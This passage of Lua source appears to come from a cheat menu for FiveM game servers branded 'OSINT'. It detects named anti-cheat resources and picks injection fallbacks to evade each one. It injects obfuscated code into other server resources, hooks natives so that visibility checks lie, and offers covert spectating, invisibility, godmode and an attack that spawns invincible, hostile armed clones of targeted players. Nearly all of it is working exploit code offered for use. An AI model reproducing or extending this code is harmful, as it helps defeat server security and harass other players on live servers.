    if enabled then
        self:Notify("success", "OSINT", ("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetServerId)) or "Unknown", targetServerId), 3000)
    else
        self:Notify("error", "OSINT", ("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetServerId)) or "Unknown", targetServerId), 3000)
    end
    local reaper = GetResourceState('ReaperV4') == 'started'

    if reaper then
        print('Spectate Fallback #3 (ReaperV4 detected, running direct)')
        if not GetPlayerName(GetPlayerFromServerId(targetServerId)) then
            self:Notify("error", "OSINT", "Target player not found!", 3000)
            print("[ReaperV4 Spectate] Error: No player found for server ID:", targetServerId)
            return
        end
        local code = string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('OSINT:Notify', "error", "OSINT", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('OSINT:Notify', "error", "OSINT", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('OSINT:Notify', "error", "OSINT", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]], tostring(enabled), targetServerId)

        local fn, err = load(code)
        if fn then
            local success, result = pcall(fn)
            if not success then
                print("[ReaperV4 Spectate] Execution error:", result)
                self:Notify("error", "OSINT", "Failed to execute spectate code!", 3000)
            else
                print("[ReaperV4 Spectate] Code executed successfully")
            end
        else
            print("[ReaperV4 Spectate] Load error:", err)
            self:Notify("error", "OSINT", "Failed to load spectate code!", 3000)
        end
    else
        if GetResourceState('FiniAC') == 'started' or GetResourceState('ElectronAC') == 'started' then
            print('Spectate Fallback #1')
            MachoInjectResourceRaw("any", string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]], tostring(enabled), targetServerId))
        else
            print('Spectate Fallback #2')
            MachoInjectResourceRaw("monitor", string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]], tostring(enabled), targetServerId))
        end
    end
end

local enviFallbackResources = {
    "envi-medic",
    "envi-hud",
    "envi-yoga",
    "envi-chopshop",
    "envi-chopshop-v2",
    "envi-foodtrucks",
    "envi-dumpsters",
    "envi-prescriptions",
    "envi-druglabs",
    "lation_laundering"
}

local function enviGetStartedFallbackResource()
    for i, res in ipairs(enviFallbackResources) do
        if GetResourceState(res) == "started" then
            return res
        end
    end
    return nil
end

local targetResource = nil
if GetResourceState("es_extended") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "es_extended"
elseif GetResourceState("core") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "core"
end

function OSINT:EnableInvisibility()
    local function HookNative(nativeName, newFunction)
        local originalNative = _G[nativeName]
        if not originalNative or type(originalNative) ~= "function" then
            return
        end
        _G[nativeName] = function(...)
            return newFunction(originalNative, ...)
        end
    end
    
    HookNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
    HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
    HookNative("IsEntityVisible", function(originalFn, ...) return true end)
    HookNative("IsEntityVisibleToScript", function(originalFn, ...) return true end)
    HookNative("SetEntityVisible", function(originalFn, ped, toggle, unk)
        if _G.osintInvisibility and _G.osintInvisibility.enabled then
            return originalFn(ped, false, unk)
        end
        return originalFn(ped, toggle, unk)
    end)
    
    if not _G.osintInvisibility then
        _G.osintInvisibility = {
            enabled = false,
            wasVisible = true,
        }
    end
    if not _G.osintInvisibility.enabled then
        _G.osintInvisibility.enabled = true
        local ped = PlayerPedId()
        _G.osintInvisibility.wasVisible = IsEntityVisible(ped)
        SetEntityVisible(ped, false, false)
        CreateThread(function()
            while _G.osintInvisibility and _G.osintInvisibility.enabled do
                local currentPed = PlayerPedId()
                if currentPed and DoesEntityExist(currentPed) then
                    SetEntityVisible(currentPed, false, false)
                end
                Wait(500)
            end
        end)
    end
end

function OSINT:DisableInvisibility()
    if _G.osintInvisibility and _G.osintInvisibility.enabled then
        _G.osintInvisibility.enabled = false
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetEntityVisible(ped, _G.osintInvisibility.wasVisible, false)
        end
    end
end

function OSINT:HandleAttackClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end
    
    local playerIdsStr = table.concat(playerIds, ",")
    MachoHookNative(0x240A18690AE96513, function(modelHash)
        return true, modelHash
    end)
    
    MachoHookNative(0xD49F9B0955C367DE, function(model, x, y, z, heading, isNetwork, thisScriptCheck)
        return true, model, x, y, z, heading, isNetwork, thisScriptCheck
    end)
    
    MachoInjectResourceRaw("monitor", string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]], playerIdsStr))
end


function OSINT:HandleGodmodeToggle(enabled)
    local waveShieldStarted = GetResourceState("WaveShield") == "started"
    local targetResource = GetResourceState("monitor") == "started" and "monitor" or (waveShieldStarted and "WaveShield" or "any")

    if waveShieldStarted then
        if enabled then
            OSINT:Notify("success", "OSINT", "Godmode Enabled (WaveShield)", 3000)
            Injection(targetResource, [[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
